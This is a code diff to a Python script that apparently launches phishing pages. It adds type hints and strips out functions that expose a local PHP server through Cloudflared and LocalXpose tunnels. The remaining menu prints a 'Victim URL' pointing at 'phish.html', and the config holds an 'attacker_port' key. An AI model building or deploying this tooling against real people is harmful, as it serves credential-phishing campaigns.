@@ -5,6 +5,7 @@ import platform
 import shutil
 import time
 from http.server import HTTPServer, SimpleHTTPRequestHandler
+from typing import Optional
 
 CONFIG_FILE = "config.json"
 
@@ -25,7 +26,7 @@ def display_banner():
     print("\033[0m")
 
 # Load or initialize the configuration file
-def load_config():
+def load_config() -> dict:
     if os.path.exists(CONFIG_FILE):
         with open(CONFIG_FILE, "r") as file:
             return json.load(file)
@@ -33,7 +34,7 @@ def load_config():
         return {"localxpose_token": "", "port": "8080", "attacker_port": "9090"}
 
 # Save configuration to file
-def save_config(config):
+def save_config(config: dict):
     with open(CONFIG_FILE, "w") as file:
         json.dump(config, file, indent=4)
 
@@ -52,7 +53,6 @@ def install_cloudflared():
     print("[*] Installing Cloudflared...")
     if not os.path.exists(".server"):
         os.makedirs(".server")
-
     arch = platform.machine()
     if arch == "x86_64":
         url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
@@ -61,7 +61,6 @@ def install_cloudflared():
     else:
         print("[!] Unsupported architecture.")
         return
-
     cloudflared_path = ".server/cloudflared"
     retries = 3
     for attempt in range(retries):
@@ -85,7 +84,6 @@ def install_localxpose():
     print("[*] Installing LocalXpose...")
     if not os.path.exists(".server"):
         os.makedirs(".server")
-
     arch = platform.machine()
     if arch == "x86_64":
         url = "https://github.com/localxpose/loclx/releases/latest/download/loclx-linux-amd64"
@@ -94,7 +92,6 @@ def install_localxpose():
     else:
         print("[!] Unsupported architecture.")
         return
-
     loclx_path = ".server/loclx"
     retries = 3
     for attempt in range(retries):
@@ -116,77 +113,8 @@ def install_localxpose():
                 print("[!] LocalXpose installation failed after multiple attempts.")
                 exit(1)
 
-# Enhanced error handling for Cloudflared tunnel
-def start_cloudflared(port, timeout=30):
-    cloudflared_path = ".server/cloudflared"
-    if not os.path.exists(cloudflared_path):
-        print("[!] Cloudflared binary is missing. Attempting to reinstall...")
-        install_cloudflared()
-
-    print("[*] Starting Cloudflared...")
-    tunnel_url = None
-    start_time = time.time()
-    retries = 3
-
-    while retries > 0:
-        try:
-            process = subprocess.Popen(
-                [cloudflared_path, "tunnel", "--url", f"http://127.0.0.1:{port}"],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
-            )
-
-            for line in process.stdout:
-                print(f"[Cloudflared Log] {line.strip()}")
-                if "trycloudflare.com" in line:
-                    tunnel_url = line.split(" ")[-1].strip()
-                    return tunnel_url
-                if time.time() - start_time > timeout:
-                    print("[!] Cloudflared timed out. Retrying...")
-                    process.terminate()
-                    retries -= 1
-                    break
-        except Exception as e:
-            print(f"[!] An error occurred: {e}")
-            retries -= 1
-            if retries == 0:
-                print("[!] Cloudflared failed after multiple attempts.")
-                return None
-        finally:
-            if process:
-                process.terminate()
-
-    print("[!] Unable to establish Cloudflared tunnel after retries.")
-    return None
-
-# Start LocalXpose and parse the tunnel URL
-def start_localxpose(port, token):
-    print("[*] Starting LocalXpose...")
-    loclx_path = ".server/loclx"
-    if not os.path.exists(loclx_path):
-        print("[!] LocalXpose binary is missing. Attempting to reinstall...")
-        install_localxpose()
-
-    try:
-        process = subprocess.Popen(
-            [loclx_path, "tunnel", "http", f"--port={port}", f"--token={token}"],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-
-        for line in process.stdout:
-            print(f"[LocalXpose Log] {line.strip()}")
-            if "https://" in line:
-                return line.strip()
-    except Exception as e:
-        print(f"[!] An error occurred while starting LocalXpose: {e}")
-
-    return None
-
 # Start a PHP server
-def start_php_server(port):
+def start_php_server(port: str):
     print(f"[*] Starting PHP server on port {port}...")
     os.chdir(".server/www")
     subprocess.Popen([f"php", "-S", f"127.0.0.1:{port}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -202,7 +130,6 @@ def main_menu():
     print("[2] Cloudflared")
     print("[3] LocalXpose")
     choice = input("Enter your choice: ").strip()
-
     if choice == "1":
         start_php_server(port)
         print(f"[+] Victim URL: http://127.0.0.1:{port}/phish.html")
